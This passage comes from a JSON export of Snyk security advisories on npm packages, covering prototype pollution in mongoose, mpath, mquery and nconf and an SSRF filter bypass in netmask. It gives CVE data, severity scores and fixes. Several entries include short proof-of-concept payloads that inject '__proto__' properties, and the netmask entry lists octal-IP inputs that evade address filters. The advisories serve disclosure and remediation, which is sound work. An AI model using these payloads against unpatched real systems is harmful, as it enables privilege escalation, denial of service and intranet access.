exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `mongoose` to version 5.13.20, 6.11.3, 7.3.4 or higher.\n## References\n- [GitHub Commit](https://github.com/automattic/mongoose/commit/305ce4ff789261df7e3f6e72363d0703e025f80d)\n- [GitHub Commit](https://github.com/Automattic/mongoose/commit/f1efabf350522257364aa5c2cb36e441cf08f1a2)\n",
        "created_at": "2023-07-17T05:43:37Z",
        "updated_at": "2024-03-11T09:53:26Z",
        "problems": [
          {
            "id": "CVE-2023-3696",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 5.13.20 to fix this vulnerability",
                "details": {
                  "upgrade_package": "5.13.20"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<5.13.20,>=6.0.0-rc0 <6.11.3,>=7.0.0-rc0 <7.3.4"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.1,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2023-07-17T05:31:42Z",
            "exploit": "Proof of Concept",
            "publication_time": "2023-07-17T07:48:02Z",
            "references": [
              {
                "url": "https://github.com/automattic/mongoose/commit/305ce4ff789261df7e3f6e72363d0703e025f80d",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/Automattic/mongoose/commit/f1efabf350522257364aa5c2cb36e441cf08f1a2",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MPATH-1577289",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[mpath](https://www.npmjs.com/package/mpath) is a package that gets/sets javascript object values using MongoDB-like path notation.\n\nAffected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2018-16490. In particular, the condition `ignoreProperties.indexOf(parts[i]) !== -1` returns `-1` if `parts[i]` is `['__proto__']`. This is because the method that has been called if the input is an array is `Array.prototype.indexOf()` and not `String.prototype.indexOf()`. They behave differently depending on the type of the input.\r\n\r\n### PoC\r\n```\r\nconst mpath = require('mpath');\r\n// mpath.set(['__proto__', 'polluted'], 'yes', {});\r\n// console.log(polluted); // ReferenceError: polluted is not defined\r\n\r\nmpath.set([['__proto__'], 'polluted'], 'yes', {});\r\nconsole.log(polluted); // yes\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `mpath` to version 0.8.4 or higher.\n## References\n- [GitHub Commit](https://github.com/aheckmann/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc)\n- [Snyk Blog](https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/)\n",
        "created_at": "2021-08-31T17:55:54Z",
        "updated_at": "2024-03-11T09:50:26Z",
        "problems": [
          {
            "id": "CVE-2021-23438",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.8.4 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.8.4"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.8.4"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.6,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2021-08-31T17:53:55Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-09-01T16:28:19Z",
            "references": [
              {
                "url": "https://github.com/aheckmann/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc",
                "title": "GitHub Commit"
              },
              {
                "url": "https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/",
                "title": "Snyk Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MQUERY-1050858",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[mquery](https://www.npmjs.org/package/mquery) is an Expressive query building for MongoDB\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `merge` function within `lib/utils.js`.  Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program. \r\n\r\n\r\n### PoC\r\n```\r\n   require('./env').getCollection(function(err, collection) {\r\n      assert.ifError(err);\r\n      col = collection;\r\n      done();\r\n    });\r\n    var payload = JSON.parse('{\"__proto__\": {\"polluted\": \"vulnerable\"}}');\r\n    var m = mquery(payload);\r\n    console.log({}.polluted);\r\n// The empty object {} will have a property called polluted which will print vulnerable\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `mquery` to version 3.2.3 or higher.\n## References\n- [mquery GitHub Commit](https://github.com/aheckmann/mquery/commit/792e69fd0a7281a0300be5cade5a6d7c1d468ad4)\n- [rxdb GitHub Commit](https://github.com/pubkey/rxdb/commit/b72ea7789ed61649ed05926bd6bac6d2bb6662d6)\n",
        "created_at": "2020-12-13T10:38:43Z",
        "updated_at": "2024-03-11T09:50:57Z",
        "problems": [
          {
            "id": "CVE-2020-35149",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.2.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.2.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.2.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-12-13T10:36:01Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-12-13T15:57:48Z",
            "references": [
              {
                "url": "https://github.com/aheckmann/mquery/commit/792e69fd0a7281a0300be5cade5a6d7c1d468ad4",
                "title": "mquery GitHub Commit"
              },
              {
                "url": "https://github.com/pubkey/rxdb/commit/b72ea7789ed61649ed05926bd6bac6d2bb6662d6",
                "title": "rxdb GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-MQUERY-1089718",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[mquery](https://www.npmjs.org/package/mquery) is an Expressive query building for MongoDB\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `mergeClone()` function.\r\n\r\n### PoC by zhou, peng\r\n```\r\nmquery = require('mquery');\r\nvar malicious_payload = '{\"__proto__\":{\"polluted\":\"HACKED\"}}';\r\nconsole.log('Before:', {}.polluted); // undefined\r\nmquery.utils.mergeClone({}, JSON.parse(malicious_payload));\r\nconsole.log('After:', {}.polluted); // HACKED\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `mquery` to version 3.2.5 or higher.\n## References\n- [GitHub Commit](https://github.com/aheckmann/mquery/commit/158f059e058579d2d08c2f1380689f5f69336778)\n- [GitHub PR](https://github.com/aheckmann/mquery/pull/121)\n",
        "created_at": "2021-03-30T09:55:07Z",
        "updated_at": "2024-03-06T14:03:39Z",
        "problems": [
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.2.5 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.2.5"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.2.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2021-03-30T09:50:31Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-03-30T14:57:04Z",
            "references": [
              {
                "url": "https://github.com/aheckmann/mquery/commit/158f059e058579d2d08c2f1380689f5f69336778",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/aheckmann/mquery/pull/121",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-NCONF-2395478",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[nconf](https://www.npmjs.com/package/nconf) is a Hierarchical node.js configuration with files, environment variables, command-line arguments, and atomic object merging.\n\nAffected versions of this package are vulnerable to Prototype Pollution. When using the `memory` engine, it is possible to store a nested JSON representation of the configuration. The `.set()` function, that is responsible for setting the configuration properties, is vulnerable to Prototype Pollution. By providing a crafted property, it is possible to modify the properties on the `Object.prototype`.\r\n\r\n\r\n## PoC\r\n\r\n```javascript\r\nconst nconf = require('nconf');\r\nnconf.use('memory')\r\n\r\nconsole.log({}.polluted)\r\n\r\nnconf.set('__proto__:polluted', 'yes')\r\n\r\nconsole.log({}.polluted)\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `nconf` to version 0.11.4 or higher.\n## References\n- [GitHub PR](https://github.com/indexzero/nconf/pull/397)\n- [GitHub Release](https://github.com/indexzero/nconf/releases/tag/v0.11.4)\n",
        "created_at": "2022-02-07T17:06:14Z",
        "updated_at": "2024-03-11T09:49:12Z",
        "problems": [
          {
            "id": "CVE-2022-21803",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.11.4 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.11.4"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.11.4"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2022-02-07T17:03:45Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-04-12T14:21:55Z",
            "references": [
              {
                "url": "https://github.com/indexzero/nconf/pull/397",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/indexzero/nconf/releases/tag/v0.11.4",
                "title": "GitHub Release"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-NETMASK-1089716",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Server-side Request Forgery (SSRF)",
        "description": "## Overview\n[netmask](https://www.npmjs.org/package/netmask) is a library to parse IPv4 CIDR blocks.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF). It incorrectly evaluates individual IPv4 octets that contain octal strings as left-stripped integers, leading to an inordinate attack surface on hundreds of thousands of projects that rely on `netmask` to filter or evaluate IPv4 block ranges, both inbound and outbound.\r\n\r\nFor example, a remote unauthenticated attacker can request local resources using input data `0177.0.0.1` (`127.0.0.1`), which `netmask` evaluates as the public IP `177.0.0.1`.\r\nContrastingly, a remote authenticated or unauthenticated attacker can input the data `0127.0.0.01` (`87.0.0.1`) as localhost, yet the input data is a public IP and can potentially cause local and remote file inclusion (LFI/RFI).\r\nA remote authenticated or unauthenticated attacker can bypass packages that rely on `netmask` to filter IP address blocks to reach intranets, VPNs, containers, adjacent VPC instances, or LAN hosts, using input data such as `012.0.0.1` (`10.0.0.1`), which `netmask` evaluates as `12.0.0.1` (public).\n\n\n **NOTE:** This vulnerability has also been identified as: [CVE-2021-29418](https://security.snyk.io/vuln/SNYK-JS-NETMASK-6056519)\n\n## Remediation\nUpgrade `netmask` to version 2.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/rs/node-netmask/commit/3f19a056c4eb808ea4a29f234274c67bc5a848f4)\n- [PoC](https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-011.md)\n- [Researcher Report](https://sick.codes/universal-netmask-npm-package-used-by-270000-projects-vulnerable-to-octal-input-data-server-side-request-forgery-remote-file-inclusion-local-file-inclusion-and-more-cve-2021-28918/)\n- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-28918.yaml)\n",
        "created_at": "2021-03-30T09:49:33Z",
        "updated_at": "2024-06-03T08:53:18Z",
        "problems": [
          {
            "id": "CVE-2021-28918",
            "source": "CVE"
          },
          {
            "id": "CWE-20",
            "source": "CWE"
          },
          {
            "id": "CWE-918",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.0.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.0.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.0.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2021-03-29T21:32:05Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-03-30T14:57:04Z",
            "references": [
              {
